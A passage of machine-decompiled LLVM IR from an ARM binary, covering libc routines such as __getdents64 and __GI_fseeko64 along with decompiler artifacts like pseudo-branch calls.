  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_2d6ec = load i32, i32* @r4, align 4
  store i32 %v3_2d6ec, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_2d704 = inttoptr i32 %arg2 to i8*
  %v4_2d704 = call i32 @__GI_memset(i8* %v3_2d704, i32 0, i32 88)
  %v2_2d708 = load i32, i32* %arg1, align 4
  %v3_2d708 = add i32 %tmp, 4
  %v4_2d708 = inttoptr i32 %v3_2d708 to i32*
  %v5_2d708 = load i32, i32* %v4_2d708, align 4
  store i32 %v5_2d708, i32* %r4.global-to-local, align 4
  %v0_2d70c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d70c = inttoptr i32 %v0_2d70c to i32*
  store i32 %v2_2d708, i32* %v1_2d70c, align 4
  %v3_2d70c = add i32 %v0_2d70c, 4
  %v4_2d70c = inttoptr i32 %v3_2d70c to i32*
  %v5_2d70c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d70c, i32* %v4_2d70c, align 4
  %v0_2d710 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d710 = add i32 %v0_2d710, 32
  %v1_2d714 = inttoptr i32 %v1_2d710 to i32*
  %v2_2d714 = load i32, i32* %v1_2d714, align 4
  %v3_2d714 = add i32 %v0_2d710, 36
  %v4_2d714 = inttoptr i32 %v3_2d714 to i32*
  %v5_2d714 = load i32, i32* %v4_2d714, align 4
  store i32 %v5_2d714, i32* %r4.global-to-local, align 4
  %v1_2d718 = add i32 %v0_2d710, 96
  %v2_2d718 = inttoptr i32 %v1_2d718 to i32*
  %v3_2d718 = load i32, i32* %v2_2d718, align 4
  store i32 %v3_2d718, i32* %r2.global-to-local, align 4
  %v1_2d71c = load i32, i32* %r6.global-to-local, align 4
  %v2_2d71c = add i32 %v1_2d71c, 32
  %v3_2d71c = inttoptr i32 %v2_2d71c to i32*
  store i32 %v2_2d714, i32* %v3_2d71c, align 4
  %v0_2d720 = load i32, i32* %r4.global-to-local, align 4
  %v1_2d720 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d720 = add i32 %v1_2d720, 36
  %v3_2d720 = inttoptr i32 %v2_2d720 to i32*
  store i32 %v0_2d720, i32* %v3_2d720, align 4
  %v0_2d724 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d724 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d724 = add i32 %v1_2d724, 12
  %v3_2d724 = inttoptr i32 %v2_2d724 to i32*
  store i32 %v0_2d724, i32* %v3_2d724, align 4
  %v0_2d728 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d728 = add i32 %v0_2d728, 48
  %v2_2d728 = inttoptr i32 %v1_2d728 to i32*
  %v3_2d728 = load i32, i32* %v2_2d728, align 4
  %v1_2d72c = add i32 %v0_2d728, 24
  store i32 %v1_2d72c, i32* %ip.global-to-local, align 4
  %v1_2d730 = inttoptr i32 %v1_2d72c to i32*
  %v2_2d730 = load i32, i32* %v1_2d730, align 4
  store i32 %v2_2d730, i32* %ip.global-to-local, align 4
  %v3_2d730 = add i32 %v0_2d728, 28
  %v4_2d730 = inttoptr i32 %v3_2d730 to i32*
  %v5_2d730 = load i32, i32* %v4_2d730, align 4
  store i32 %v5_2d730, i32* %lr.global-to-local, align 4
  %v1_2d734 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d734 = add i32 %v1_2d734, 44
  %v3_2d734 = inttoptr i32 %v2_2d734 to i32*
  store i32 %v3_2d728, i32* %v3_2d734, align 4
  %v0_2d738 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d738 = add i32 %v0_2d738, 64
  %v2_2d738 = inttoptr i32 %v1_2d738 to i32*
  %v3_2d738 = load i32, i32* %v2_2d738, align 4
  %v1_2d73c = add i32 %v0_2d738, 56
  %v2_2d73c = inttoptr i32 %v1_2d73c to i32*
  %v3_2d73c = load i32, i32* %v2_2d73c, align 4
  store i32 %v3_2d73c, i32* %r2.global-to-local, align 4
  %v1_2d740 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d740 = add i32 %v1_2d740, 52
  %v3_2d740 = inttoptr i32 %v2_2d740 to i32*
  store i32 %v3_2d738, i32* %v3_2d740, align 4
  %v0_2d744 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d744 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d744 = add i32 %v1_2d744, 48
  %v3_2d744 = inttoptr i32 %v2_2d744 to i32*
  store i32 %v0_2d744, i32* %v3_2d744, align 4
  %v0_2d748 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d748 = add i32 %v0_2d748, 72
  %v1_2d74c = inttoptr i32 %v1_2d748 to i32*
  %v2_2d74c = load i32, i32* %v1_2d74c, align 4
  %v3_2d74c = add i32 %v0_2d748, 76
  %v4_2d74c = inttoptr i32 %v3_2d74c to i32*
  %v5_2d74c = load i32, i32* %v4_2d74c, align 4
  store i32 %v5_2d74c, i32* %r1.global-to-local, align 4
  %v0_2d750 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d750 = add i32 %v0_2d750, 56
  %v1_2d754 = inttoptr i32 %v1_2d750 to i32*
  store i32 %v2_2d74c, i32* %v1_2d754, align 4
  %v3_2d754 = add i32 %v0_2d750, 60
  %v4_2d754 = inttoptr i32 %v3_2d754 to i32*
  %v5_2d754 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d754, i32* %v4_2d754, align 4
  %v0_2d758 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d758 = add i32 %v0_2d758, 80
  %v1_2d75c = inttoptr i32 %v1_2d758 to i32*
  %v2_2d75c = load i32, i32* %v1_2d75c, align 4
  %v3_2d75c = add i32 %v0_2d758, 84
  %v4_2d75c = inttoptr i32 %v3_2d75c to i32*
  %v5_2d75c = load i32, i32* %v4_2d75c, align 4
  store i32 %v5_2d75c, i32* %r1.global-to-local, align 4
  %v0_2d760 = load i32, i32* %r6.global-to-local, align 4
  %v1_2d760 = add i32 %v0_2d760, 64
  %v1_2d764 = inttoptr i32 %v1_2d760 to i32*
  store i32 %v2_2d75c, i32* %v1_2d764, align 4
  %v3_2d764 = add i32 %v0_2d760, 68
  %v4_2d764 = inttoptr i32 %v3_2d764 to i32*
  %v5_2d764 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d764, i32* %v4_2d764, align 4
  %v0_2d768 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d768 = add i32 %v0_2d768, 16
  %v2_2d768 = inttoptr i32 %v1_2d768 to i32*
  %v3_2d768 = load i32, i32* %v2_2d768, align 4
  %v1_2d76c = load i32, i32* %r6.global-to-local, align 4
  %v2_2d76c = add i32 %v1_2d76c, 16
  %v3_2d76c = inttoptr i32 %v2_2d76c to i32*
  store i32 %v3_2d768, i32* %v3_2d76c, align 4
  %v0_2d770 = load i32, i32* %r5.global-to-local, align 4
  %v1_2d770 = add i32 %v0_2d770, 88
  %v1_2d774 = add i32 %v0_2d770, 20
  %v2_2d774 = inttoptr i32 %v1_2d774 to i32*
  %v3_2d774 = load i32, i32* %v2_2d774, align 4
  store i32 %v3_2d774, i32* %r2.global-to-local, align 4
  %v1_2d778 = inttoptr i32 %v1_2d770 to i32*
  %v2_2d778 = load i32, i32* %v1_2d778, align 4
  %v3_2d778 = add i32 %v0_2d770, 92
  %v4_2d778 = inttoptr i32 %v3_2d778 to i32*
  %v5_2d778 = load i32, i32* %v4_2d778, align 4
  store i32 %v5_2d778, i32* %r1.global-to-local, align 4
  %v0_2d77c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d77c = add i32 %v0_2d77c, 72
  %v1_2d780 = inttoptr i32 %v1_2d77c to i32*
  store i32 %v2_2d778, i32* %v1_2d780, align 4
  %v3_2d780 = add i32 %v0_2d77c, 76
  %v4_2d780 = inttoptr i32 %v3_2d780 to i32*
  %v5_2d780 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2d780, i32* %v4_2d780, align 4
  %v0_2d784 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d784 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d784 = add i32 %v1_2d784, 20
  %v3_2d784 = inttoptr i32 %v2_2d784 to i32*
  store i32 %v0_2d784, i32* %v3_2d784, align 4
  %v0_2d788 = load i32, i32* %ip.global-to-local, align 4
  %v1_2d788 = load i32, i32* %r6.global-to-local, align 4
  %v2_2d788 = add i32 %v1_2d788, 24
  %v3_2d788 = inttoptr i32 %v2_2d788 to i32*
  store i32 %v0_2d788, i32* %v3_2d788, align 4
  %v0_2d78c = load i32, i32* %lr.global-to-local, align 4
  %v1_2d78c = load i32, i32* %r6.global-to-local, align 4
  %v2_2d78c = add i32 %v1_2d78c, 28
  %v3_2d78c = inttoptr i32 %v2_2d78c to i32*
  store i32 %v0_2d78c, i32* %v3_2d78c, align 4
  %v2_2d790 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d790, i32* %r4.global-to-local, align 4
  ret i32 %v2_2d778

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 2, 4, 3, 5, 6, 7, 11, 8, 9, 10 }
  uselistorder i32 84, { 2, 3, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 96, { 7, 4, 5, 1, 2, 3, 8, 9, 0, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_2d79c = load i32, i32* @r5, align 4
  %v12_2d79c = load i32, i32* @r7, align 4
  %v1_2d7a0 = add i32 %arg3, 14
  %v2_2d7a8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_2d7ac = and i32 %v1_2d7a0, -8
  %v2_2d7b0 = sub i32 %v2_2d7a8, %v1_2d7ac
  %v1_2d7b4 = add i32 %v2_2d7b0, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_2d7f8, label %dec_label_pc_2d7dc

dec_label_pc_2d7dc:                               ; preds = %entry
  %v1_2d7e0 = sub i32 0, %arg1
  %v3_2d7e4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2d7e4 = sext i16 %v3_2d7e4 to i32
  %v0_2d7e8 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2d7f0 = add i32 %v4_2d7e4, %v0_2d7e8
  %v4_2d7f0 = inttoptr i32 %v3_2d7f0 to i32*
  store i32 %v1_2d7e0, i32* %v4_2d7f0, align 4
  br label %dec_label_pc_2d8c8

dec_label_pc_2d7f8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_2d8c8, label %dec_label_pc_2d800

dec_label_pc_2d800:                               ; preds = %dec_label_pc_2d7f8
  %v2_2d800 = add i32 %v1_2d7b4, %arg1
  store i32 %v2_2d800, i32* %r1.global-to-local, align 4
  %v2_2d804 = add i32 %tmp, %arg3
  store i32 %v1_2d7b4, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_2d8b0

dec_label_pc_2d820:                               ; preds = %dec_label_pc_2d8b0
  %v1_2d820 = add i32 %v0_2d880, 16
  %v2_2d820 = inttoptr i32 %v1_2d820 to i16*
  %v3_2d820 = load i16, i16* %v2_2d820, align 2
  %v4_2d820 = zext i16 %v3_2d820 to i32
  %v1_2d824 = add nsw i32 %v4_2d820, -19
  store i32 %v1_2d824, i32* @r2, align 4
  %v1_2d828 = add nuw nsw i32 %v4_2d820, 7
  %v1_2d82c = and i32 %v1_2d828, 131064
  store i32 %v1_2d82c, i32* @ip, align 4
  %v2_2d834 = add i32 %v1_2d82c, %v0_2d888
  store i32 %v2_2d834, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_2d834, %v2_2d804
  br i1 %tmp24, label %dec_label_pc_2d840, label %dec_label_pc_2d87c

dec_label_pc_2d840:                               ; preds = %dec_label_pc_2d820
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_2d848 = load i32, i32* %r8.global-to-local, align 4
  %v0_2d84c = load i32, i32* %sb.global-to-local, align 4
  %v1_2d850 = load i32, i32* @sp, align 4
  %v2_2d850 = inttoptr i32 %v1_2d850 to i32*
  store i32 0, i32* %v2_2d850, align 4
  %v4_2d854 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_2d848, i32 %v0_2d84c)
  %v0_2d858 = load i32, i32* @r5, align 4
  %v1_2d858 = load i32, i32* %sl.global-to-local, align 4
  %v9_2d858 = icmp eq i32 %v0_2d858, %v1_2d858
  br i1 %v9_2d858, label %dec_label_pc_2d860, label %dec_label_pc_2d8c4

dec_label_pc_2d860:                               ; preds = %dec_label_pc_2d840
  %v0_2d864 = call i32 @__aeabi_read_tp()
  %v3_2d868 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2d868 = sext i16 %v3_2d868 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2d874 = add i32 %v4_2d868, %v0_2d864
  %v4_2d874 = inttoptr i32 %v3_2d874 to i32*
  store i32 22, i32* %v4_2d874, align 4
  br label %dec_label_pc_2d8c8

dec_label_pc_2d87c:                               ; preds = %dec_label_pc_2d820
  %v1_2d87c = inttoptr i32 %v0_2d880 to i32*
  %v2_2d87c = load i32, i32* %v1_2d87c, align 4
  %v3_2d87c = add i32 %v0_2d880, 4
  %v4_2d87c = inttoptr i32 %v3_2d87c to i32*
  %v5_2d87c = load i32, i32* %v4_2d87c, align 4
  store i32 %v5_2d87c, i32* @r4, align 4
  %v1_2d880 = add i32 %v0_2d880, 8
  store i32 %v1_2d880, i32* %r8.global-to-local, align 4
  %v1_2d884 = inttoptr i32 %v1_2d880 to i32*
  %v2_2d884 = load i32, i32* %v1_2d884, align 4
  store i32 %v2_2d884, i32* %r8.global-to-local, align 4
  %v3_2d884 = add i32 %v0_2d880, 12
  %v4_2d884 = inttoptr i32 %v3_2d884 to i32*
  %v5_2d884 = load i32, i32* %v4_2d884, align 4
  store i32 %v5_2d884, i32* %sb.global-to-local, align 4
  %v1_2d888 = inttoptr i32 %v0_2d888 to i32*
  store i32 %v2_2d87c, i32* %v1_2d888, align 4
  %v3_2d888 = add i32 %v0_2d888, 4
  %v4_2d888 = inttoptr i32 %v3_2d888 to i32*
  %v5_2d888 = load i32, i32* @r4, align 4
  store i32 %v5_2d888, i32* %v4_2d888, align 4
  %v0_2d88c = load i32, i32* %r8.global-to-local, align 4
  %v1_2d88c = load i32, i32* @r5, align 4
  %v2_2d88c = add i32 %v1_2d88c, 8
  %v3_2d88c = inttoptr i32 %v2_2d88c to i32*
  store i32 %v0_2d88c, i32* %v3_2d88c, align 4
  %v0_2d890 = load i32, i32* %sb.global-to-local, align 4
  %v1_2d890 = load i32, i32* @r5, align 4
  %v2_2d890 = add i32 %v1_2d890, 12
  %v3_2d890 = inttoptr i32 %v2_2d890 to i32*
  store i32 %v0_2d890, i32* %v3_2d890, align 4
  %v0_2d894 = load i32, i32* @ip, align 4
  %v1_2d894 = trunc i32 %v0_2d894 to i16
  %v2_2d894 = load i32, i32* @r5, align 4
  %v3_2d894 = add i32 %v2_2d894, 16
  %v4_2d894 = inttoptr i32 %v3_2d894 to i16*
  store i16 %v1_2d894, i16* %v4_2d894, align 2
  %v0_2d898 = load i32, i32* @r7, align 4
  %v1_2d898 = add i32 %v0_2d898, 18
  %v2_2d898 = inttoptr i32 %v1_2d898 to i8*
  %v3_2d898 = load i8, i8* %v2_2d898, align 1
  %v4_2d898 = zext i8 %v3_2d898 to i32
  store i32 %v4_2d898, i32* @r3, align 4
  %v2_2d89c = load i32, i32* @r5, align 4
  %v3_2d89c = add i32 %v2_2d89c, 18
  %v4_2d89c = inttoptr i32 %v3_2d89c to i8*
  store i8 %v3_2d898, i8* %v4_2d89c, align 1
  %v0_2d8a0 = call i32 @memcpy()
  %v0_2d8a4 = load i32, i32* @r7, align 4
  %v1_2d8a4 = add i32 %v0_2d8a4, 16
  %v2_2d8a4 = inttoptr i32 %v1_2d8a4 to i16*
  %v3_2d8a4 = load i16, i16* %v2_2d8a4, align 2
  %v4_2d8a4 = zext i16 %v3_2d8a4 to i32
  %v0_2d8a8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2d8a8, i32* @r5, align 4
  %v2_2d8ac = add i32 %v4_2d8a4, %v0_2d8a4
  store i32 %v2_2d8ac, i32* @r7, align 4
  br label %dec_label_pc_2d8b0

dec_label_pc_2d8b0:                               ; preds = %dec_label_pc_2d800, %dec_label_pc_2d87c
  %v0_2d888 = phi i32 [ %tmp, %dec_label_pc_2d800 ], [ %v0_2d8a8, %dec_label_pc_2d87c ]
  %v0_2d880 = phi i32 [ %v1_2d7b4, %dec_label_pc_2d800 ], [ %v2_2d8ac, %dec_label_pc_2d87c ]
  %v3_2d8b4 = icmp ult i32 %v0_2d880, %v2_2d800
  %v1_2d8b8 = add i32 %v0_2d888, 19
  store i32 %v1_2d8b8, i32* @r0, align 4
  %v1_2d8bc = add i32 %v0_2d880, 19
  store i32 %v1_2d8bc, i32* @r1, align 4
  br i1 %v3_2d8b4, label %dec_label_pc_2d820, label %dec_label_pc_2d8c4.loopexit

dec_label_pc_2d8c4.loopexit:                      ; preds = %dec_label_pc_2d8b0
  %v0_2d8c4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2d8c4

dec_label_pc_2d8c4:                               ; preds = %dec_label_pc_2d8c4.loopexit, %dec_label_pc_2d840
  %v1_2d8c4 = phi i32 [ %v0_2d888, %dec_label_pc_2d8c4.loopexit ], [ %v0_2d858, %dec_label_pc_2d840 ]
  %v0_2d8c4 = phi i32 [ %v0_2d8c4.pre, %dec_label_pc_2d8c4.loopexit ], [ %v1_2d858, %dec_label_pc_2d840 ]
  %v2_2d8c4 = sub i32 %v1_2d8c4, %v0_2d8c4
  store i32 %v2_2d8c4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d8c8

dec_label_pc_2d8c8:                               ; preds = %dec_label_pc_2d7f8, %dec_label_pc_2d860, %dec_label_pc_2d7dc, %dec_label_pc_2d8c4
  %v0_2d8c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_2d79c, i32* @r5, align 4
  store i32 %v12_2d79c, i32* @r7, align 4
  ret i32 %v0_2d8c8

; uselistorder directives
  uselistorder i32 %v0_2d880, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_2d888, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_2d7b4, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 1, 2, 0, 4, 3 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 9, 19, 20, 0, 10, 11, 12, 13, 14, 15, 16, 17, 1, 2, 3, 4, 5, 6, 7, 18, 8 }
  uselistorder i32 %arg1, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_2d8c8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_2d8b0, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_2d8ec = load i32, i32* @r1, align 4
  store i32 %v0_2d8ec, i32* @r2, align 4
  %v0_2d8f4 = call i32 @__GI_fseeko64()
  ret i32 %v0_2d8f4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %v3_2d904 = load i32, i32* @r4, align 4
  %v6_2d904 = load i32, i32* @r5, align 4
  %v12_2d904 = load i32, i32* @r7, align 4
  %v2_2d908 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %tmp18, i32* %sl.global-to-local, align 4
  %v2_2d910 = icmp ugt i32 %tmp18, 1
  store i1 %v2_2d910, i1* %cpsr_c.global-to-local, align 1
  %v7_2d910 = icmp eq i32 %tmp18, 2
  %v0_2d914 = load i32, i32* @r0, align 4
  store i32 %v0_2d914, i32* @r7, align 4
  %v2_2d918 = xor i1 %v2_2d910, true
  %v3_2d918 = or i1 %v7_2d910, %v2_2d918
  br i1 %v3_2d918, label %dec_label_pc_2d938, label %dec_label_pc_2d91c

dec_label_pc_2d91c:                               ; preds = %entry
  store i32 86024, i32* %r2.global-to-local, align 4
  %v0_2d920 = call i32 @__aeabi_read_tp()
  %v3_2d924 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2d924 = sext i16 %v3_2d924 to i32
  store i32 %v4_2d924, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v3_2d930 = add i32 %v4_2d924, %v0_2d920
  %v4_2d930 = inttoptr i32 %v3_2d930 to i32*
  store i32 22, i32* %v4_2d930, align 4
  br label %dec_label_pc_2dab0

dec_label_pc_2d938:                               ; preds = %entry
  %v1_2d938 = add i32 %v0_2d914, 52
  %v2_2d938 = inttoptr i32 %v1_2d938 to i32*
  %v3_2d938 = load i32, i32* %v2_2d938, align 4
  store i32 %v3_2d938, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2d93c = icmp eq i32 %v3_2d938, 0
  %v2_2d940 = load i32, i32* @r2, align 4
  store i32 %v2_2d940, i32* %stack_var_-40, align 4
  br i1 %v2_2d93c, label %dec_label_pc_2d948, label %dec_label_pc_2d9ac

dec_label_pc_2d948:                               ; preds = %dec_label_pc_2d938
  %v0_2d948 = call i32 @__aeabi_read_tp()
  %v0_2d94c = load i32, i32* @r7, align 4
  %v1_2d94c = add i32 %v0_2d94c, 64
  %v2_2d94c = inttoptr i32 %v1_2d94c to i32*
  %v3_2d94c = load i32, i32* %v2_2d94c, align 4
  store i32 %v3_2d94c, i32* %r3.global-to-local, align 4
  %v1_2d950 = add i32 %v0_2d948, -1168
  store i32 %v1_2d950, i32* %r6.global-to-local, align 4
  %v3_2d954 = icmp uge i32 %v3_2d94c, %v1_2d950
  store i1 %v3_2d954, i1* %cpsr_c.global-to-local, align 1
  %v9_2d954 = icmp eq i32 %v3_2d94c, %v1_2d950
  br i1 %v9_2d954, label %dec_label_pc_2d9a0, label %dec_label_pc_2d95c

dec_label_pc_2d95c:                               ; preds = %dec_label_pc_2d948
  %v1_2d95c = add i32 %v0_2d94c, 56
  store i32 %v1_2d95c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_2d95c, i32* %r2.global-to-local, align 4
  %v0_2d968 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_2d968, i32* @r4, align 4
  %v1_2d96c37 = inttoptr i32 %v1_2d95c to i32*
  %v2_2d96c38 = load i32, i32* %v1_2d96c37, align 4
  store i32 %v2_2d96c38, i32* %r3.global-to-local, align 4
  %v3_2d97040 = icmp uge i32 %v2_2d96c38, %v0_2d968
  store i1 %v3_2d97040, i1* %cpsr_c.global-to-local, align 1
  %v9_2d97046 = icmp eq i32 %v2_2d96c38, %v0_2d968
  br i1 %v9_2d97046, label %dec_label_pc_2d978, label %dec_label_pc_2d990

dec_label_pc_2d978:                               ; preds = %dec_label_pc_2d95c, %dec_label_pc_2d978.dec_label_pc_2d96c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2d988 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2d988, label %dec_label_pc_2d98c, label %dec_label_pc_2d978.dec_label_pc_2d96c_crit_edge

dec_label_pc_2d978.dec_label_pc_2d96c_crit_edge:  ; preds = %dec_label_pc_2d978
  %v0_2d96c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2d970.pre = load i32, i32* @r4, align 4
  %v1_2d96c = inttoptr i32 %v0_2d96c.pre to i32*
  %v2_2d96c = load i32, i32* %v1_2d96c, align 4
  store i32 %v2_2d96c, i32* %r3.global-to-local, align 4
  %v3_2d970 = icmp uge i32 %v2_2d96c, %v1_2d970.pre
  store i1 %v3_2d970, i1* %cpsr_c.global-to-local, align 1
  %v9_2d970 = icmp eq i32 %v2_2d96c, %v1_2d970.pre
  br i1 %v9_2d970, label %dec_label_pc_2d978, label %dec_label_pc_2d990

dec_label_pc_2d98c:                               ; preds = %dec_label_pc_2d978
  %v0_2d98c = load i32, i32* @r4, align 4
  store i32 %v0_2d98c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2d990

dec_label_pc_2d990:                               ; preds = %dec_label_pc_2d95c, %dec_label_pc_2d978.dec_label_pc_2d96c_crit_edge, %dec_label_pc_2d98c
  %v0_2d990 = phi i32 [ %v0_2d98c, %dec_label_pc_2d98c ], [ %v2_2d96c38, %dec_label_pc_2d95c ], [ %v2_2d96c, %dec_label_pc_2d978.dec_label_pc_2d96c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2d990 = icmp eq i32 %v0_2d990, 0
  br i1 %v2_2d990, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_2d990
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_2d990, %bb
  store i32 186780, i32* @lr, align 4
  %v1_2d998 = xor i1 %v2_2d990, true
  call void @__pseudo_cond_branch(i1 %v1_2d998, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2d99c = load i32, i32* %r6.global-to-local, align 4
  %v1_2d99c = load i32, i32* @r7, align 4
  %v2_2d99c = add i32 %v1_2d99c, 64
  %v3_2d99c = inttoptr i32 %v2_2d99c to i32*
  store i32 %v0_2d99c, i32* %v3_2d99c, align 4
  %v0_2d9a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2d9a0

dec_label_pc_2d9a0:                               ; preds = %dec_label_pc_2d948, %bb21
  %v0_2d9a0 = phi i32 [ %v0_2d94c, %dec_label_pc_2d948 ], [ %v0_2d9a0.pre, %bb21 ]
  %v1_2d9a0 = add i32 %v0_2d9a0, 60
  %v2_2d9a0 = inttoptr i32 %v1_2d9a0 to i32*
  %v3_2d9a0 = load i32, i32* %v2_2d9a0, align 4
  %v1_2d9a4 = add i32 %v3_2d9a0, 1
  store i32 %v1_2d9a4, i32* %r3.global-to-local, align 4
  store i32 %v1_2d9a4, i32* %v2_2d9a0, align 4
  %v0_2d9ac.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2d9ac

dec_label_pc_2d9ac:                               ; preds = %dec_label_pc_2d938, %dec_label_pc_2d9a0
  %v0_2d9b8 = phi i32 [ %v0_2d914, %dec_label_pc_2d938 ], [ %v0_2d9ac.pre, %dec_label_pc_2d9a0 ]
  %v1_2d9ac = inttoptr i32 %v0_2d9b8 to i16*
  %v2_2d9ac = load i16, i16* %v1_2d9ac, align 2
  %v3_2d9ac = zext i16 %v2_2d9ac to i32
  store i32 %v3_2d9ac, i32* %r3.global-to-local, align 4
  %v1_2d9b0 = and i32 %v3_2d9ac, 64
  %v2_2d9b0 = icmp eq i32 %v1_2d9b0, 0
  br i1 %v2_2d9b0, label %dec_label_pc_2d9c8, label %dec_label_pc_2d9b8

dec_label_pc_2d9b8:                               ; preds = %dec_label_pc_2d9ac
  store i32 %v0_2d9b8, i32* @r0, align 4
  %v0_2d9bc = call i32 @__stdio_wcommit()
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2d9c0 = icmp eq i32 %v0_2d9bc, 0
  br i1 %v2_2d9c0, label %dec_label_pc_2d9c8, label %dec_label_pc_2da30

dec_label_pc_2d9c8:                               ; preds = %dec_label_pc_2d9b8, %dec_label_pc_2d9ac
  %v0_2d9c8 = load i32, i32* %sl.global-to-local, align 4
  %v2_2d9c8 = icmp ne i32 %v0_2d9c8, 0
  store i1 %v2_2d9c8, i1* %cpsr_c.global-to-local, align 1
  %v7_2d9c8 = icmp eq i32 %v0_2d9c8, 1
  br i1 %v7_2d9c8, label %dec_label_pc_2d9d0, label %dec_label_pc_2d9e4

dec_label_pc_2d9d0:                               ; preds = %dec_label_pc_2d9c8
  %v0_2d9d0 = load i32, i32* @r7, align 4
  store i32 %v2_2d908, i32* %r1.global-to-local, align 4
  %v2_2d9d8 = inttoptr i32 %v0_2d9d0 to i16*
  %v3_2d9d8 = call i32 @__stdio_adjust_position(i16* %v2_2d9d8, i32 %v2_2d908)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
